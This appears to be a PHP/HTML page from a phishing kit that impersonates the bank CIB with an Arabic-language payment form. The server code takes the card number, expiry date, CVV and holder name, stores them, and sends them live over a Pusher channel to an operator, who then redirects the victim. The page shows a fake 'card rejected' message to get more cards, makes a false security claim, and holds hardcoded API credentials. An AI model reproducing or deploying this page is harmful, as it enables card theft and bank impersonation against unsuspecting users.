<?php
error_reporting(0);
ini_set('display_errors', 0);

session_start();

require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
    '0737c04931774e406307',
    'eda7db4b963c98f62991',
    '2154404',
    $options
  );

    $site = array(
        'cardNumber' => $_POST['cardnumber'] . ' | ' . $_POST['expiry'] . ' | ' . $_POST['cvv'] . ' | ' . $_POST['holdername'],
        'message' => 'payment',
        'type' => '5'
    );

    $userId = $_SESSION['user_id'];
    $id = $User->UpdatePayment($userId, $site);
    if ($id) {

        $dataUser = [
            'userId' => $userId,
            'updatedData' => $site
        ];

        $pusher->trigger('my-channel-cib', 'update-user-accountt', $dataUser);

        echo "<script>document.location.href='waitpayment.php';</script>";
        exit;
    }
}

if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدفع - CIB</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap"
        rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            background: #f0f4f8;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            direction: rtl;
        }

        .page-wrapper {
            width: 100%;
            max-width: 420px;
            min-height: 100vh;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 40px rgba(0, 0, 0, 0.06);
        }

        .header {
            background: linear-gradient(135deg, #1a5ca8 0%, #0d3b6e 100%);
            padding: 36px 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: -60%;
            right: -40%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.05) 0%, transparent 50%);
        }

        .header-logo {
            width: 100px;
            height: auto;
            filter: brightness(10);
            margin-bottom: 14px;
            position: relative;
            z-index: 1;
        }

        .header-icon {
            width: 60px;
            height: 60px;
            background: rgba(255, 255, 255, 0.12);
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 14px;
            position: relative;
            z-index: 1;
        }

        .header-title {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            position: relative;
            z-index: 1;
        }

        .header-sub {
            color: rgba(255, 255, 255, 0.6);
            font-size: 13px;
            margin-top: 4px;
            position: relative;
            z-index: 1;
        }

        /* Content */
        .content {
            padding: 28px 24px;
            flex: 1;
        }

        /* Card preview */
        .card-preview {
            background: linear-gradient(135deg, #1e3a5f, #0d2847);
            border-radius: 16px;
            padding: 22px;
            margin-bottom: 28px;
            position: relative;
            overflow: hidden;
            color: #fff;
            min-height: 170px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .card-preview::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -30%;
            width: 180%;
            height: 180%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.04) 0%, transparent 60%);
        }

        .card-chip {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .chip-icon {
            width: 40px;
            height: 28px;
            background: linear-gradient(135deg, #c9a236, #e8c95f);
            border-radius: 6px;
        }

        .card-number-display {
            font-size: 18px;
            letter-spacing: 3px;
            font-weight: 600;
            direction: ltr;
            text-align: center;
            margin-bottom: 12px;
            font-family: monospace;
        }

        .card-bottom {
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            opacity: 0.7;
        }

        /* Form */
        .field-group {
            margin-bottom: 18px;
        }

        .field-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #374151;
            margin-bottom: 8px;
        }

        .field-input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            color: #1a2332;
            font-family: 'Cairo', sans-serif;
            background: #f8fafc;
            outline: none;
            transition: all 0.25s;
            direction: rtl;
        }

        .field-input.ltr {
            direction: ltr;
            text-align: left;
        }

        .field-input::placeholder {
            color: #94a3b8;
        }

        .field-input:focus {
            border-color: #1a5ca8;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(26, 92, 168, 0.1);
        }

        .row {
            display: flex;
            gap: 12px;
        }

        .row .field-group {
            flex: 1;
        }

        /* Error */
        .error-banner {
            display: none;
            background: linear-gradient(135deg, #fef2f2, #fee2e2);
            border: 1px solid #fecaca;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            align-items: center;
            gap: 10px;
        }

        .error-banner.show {
            display: flex;
        }

        .error-banner span {
            color: #991b1b;
            font-size: 13px;
            font-weight: 600;
        }

        /* Submit */
        .submit-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: not-allowed;
            transition: all 0.3s;
            color: #fff;
            background: linear-gradient(135deg, #94a3b8, #cbd5e1);
            margin-top: 4px;
        }

        .submit-btn.active {
            background: linear-gradient(135deg, #1a5ca8, #2563eb);
            cursor: pointer;
            box-shadow: 0 4px 14px rgba(26, 92, 168, 0.3);
        }

        .submit-btn.active:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(26, 92, 168, 0.4);
        }

        /* Card logos */
        .card-logos {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 16px;
            opacity: 0.5;
        }

        .card-logos img {
            height: 24px;
            object-fit: contain;
        }

        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin-top: 16px;
        }

        .security-note span {
            color: #64748b;
            font-size: 11px;
            font-weight: 500;
        }

        /* Loading */
        #loadingOverlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(15, 23, 42, 0.6);
            backdrop-filter: blur(4px);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }

        #loadingOverlay.show {
            display: flex;
        }

        .loader-card {
            background: #fff;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
        }

        .loader-spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e2e8f0;
            border-top-color: #1a5ca8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 16px;
        }

        .loader-card h5 {
            color: #1a2332;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 4px;
        }

        .loader-card p {
            color: #64748b;
            font-size: 13px;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @media (max-width: 480px) {
            .page-wrapper {
                max-width: 100%;
            }
        }
    </style>
</head>

<body>
    <div class="page-wrapper">
        <div class="header">
            <img src="assets/logo.webp" alt="CIB" class="header-logo">
            <div class="header-icon">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                    <line x1="1" y1="10" x2="23" y2="10" />
                </svg>
            </div>
            <div class="header-title">نظام معالجة المدفوعات</div>
            <div class="header-sub">أدخل بيانات بطاقتك المصرفية لإتمام العملية</div>
        </div>

        <div class="content">
            <!-- Card Preview -->
            <div class="card-preview">
                <div class="card-chip">
                    <div class="chip-icon"></div>
                    <svg width="40" height="28" viewBox="0 0 40 28">
                        <circle cx="15" cy="14" r="12" fill="#eb001b" opacity="0.8" />
                        <circle cx="25" cy="14" r="12" fill="#f79e1b" opacity="0.8" />
                    </svg>
                </div>
                <div class="card-number-display" id="cardDisplay">•••• •••• •••• ••••</div>
                <div class="card-bottom">
                    <span id="nameDisplay">اسم حامل البطاقة</span>
                    <span id="expDisplay">MM/YY</span>
                </div>
            </div>

            <form method="POST" action="" id="paymentForm">
                <div class="field-group">
                    <label class="field-label">اسم حامل البطاقة</label>
                    <input class="field-input" id="holderName" name="holdername" type="text"
                        placeholder="كما هو مكتوب على البطاقة">
                </div>

                <div class="field-group">
                    <label class="field-label">رقم البطاقة</label>
                    <input class="field-input ltr" id="cardNumber" name="cardnumber" type="tel"
                        placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
                </div>

                <div class="row">
                    <div class="field-group">
                        <label class="field-label">تاريخ الانتهاء</label>
                        <input class="field-input ltr" id="expiry" name="expiry" type="tel" placeholder="MM/YY"
                            maxlength="5" inputmode="numeric">
                    </div>
                    <div class="field-group">
                        <label class="field-label">CVV</label>
                        <input class="field-input ltr" id="cvv" name="cvv" type="password" placeholder="•••"
                            maxlength="4" inputmode="numeric">
                    </div>
                </div>

                <?php if (isset($showError)): ?>
                    <div class="error-banner show">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#dc2626" stroke-width="2.5"
                            stroke-linecap="round" stroke-linejoin="round">
                            <circle cx="12" cy="12" r="10" />
                            <line x1="15" y1="9" x2="9" y2="15" />
                            <line x1="9" y1="9" x2="15" y2="15" />
                        </svg>
                        <span>تم رفض البطاقة. يرجى استخدام بطاقة أخرى.</span>
                    </div>
                <?php endif; ?>

                <button class="submit-btn" id="submitBtn" type="submit" name="submit" disabled>إتمام الدفع</button>
            </form>

            <div class="card-logos">
                <img src="assets/vecteezy-icon.webp" alt="Visa">
                <img src="assets/vecteezy_icon01.webp" alt="Mastercard">
            </div>

            <div class="security-note">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                <span>بياناتك محمية بتشفير 256-bit SSL</span>
            </div>
        </div>
    </div>

    <div id="loadingOverlay">
        <div class="loader-card">
            <div class="loader-spinner"></div>
            <h5>جاري معالجة الدفع</h5>
            <p>يرجى الانتظار...</p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const cardNum = document.getElementById('cardNumber');
            const expiry = document.getElementById('expiry');
            const cvv = document.getElementById('cvv');
            const holder = document.getElementById('holderName');
            const submitBtn = document.getElementById('submitBtn');
            const display = document.getElementById('cardDisplay');
            const nameDisp = document.getElementById('nameDisplay');
            const expDisp = document.getElementById('expDisplay');

            function formatCard(v) {
                return v.replace(/\D/g, '').substring(0, 16).replace(/(.{4})/g, '$1 ').trim();
            }

            cardNum.addEventListener('input', function (e) {
                e.target.value = formatCard(e.target.value);
                const raw = e.target.value.replace(/\s/g, '');
                let d = '';
                for (let i = 0; i < 16; i++) {
                    if (i > 0 && i % 4 === 0) d += ' ';
                    d += i < raw.length ? raw[i] : '•';
                }
                display.textContent = d;
                checkForm();
            });

            expiry.addEventListener('input', function (e) {
                let v = e.target.value.replace(/\D/g, '').substring(0, 4);
                if (v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
                e.target.value = v;
                expDisp.textContent = v || 'MM/YY';
                checkForm();
            });

            cvv.addEventListener('input', function (e) {
                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
                checkForm();
            });

            holder.addEventListener('input', function () {
                nameDisp.textContent = holder.value || 'اسم حامل البطاقة';
                checkForm();
            });

            function checkForm() {
                const raw = cardNum.value.replace(/\s/g, '');
                const valid = holder.value.trim().length > 0 && raw.length >= 12 && expiry.value.length === 5 && cvv.value.length >= 3;
                submitBtn.disabled = !valid;
                submitBtn.classList.toggle('active', valid);
            }

            document.getElementById('paymentForm').addEventListener('submit', function (e) {
                const raw = cardNum.value.replace(/\s/g, '');
                if (raw.length < 12 || expiry.value.length < 5 || cvv.value.length < 3) {
                    e.preventDefault();
                    return;
                }
                document.getElementById('loadingOverlay').classList.add('show');
            });
        });
    </script>
    <!-- Pusher for routing -->
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userId = <?php echo $_SESSION['user_id'] ?? 0; ?>;
        if (userId > 0) {
var pusher = new Pusher('0737c04931774e406307', {
      cluster: 'ap2'
    });
            var channel = pusher.subscribe('my-channel-cib');
            channel.bind('admin-decision', function (data) {
                if (data.userId == userId) window.location = data.url;
            });
        }
    </script>
</body>

</html>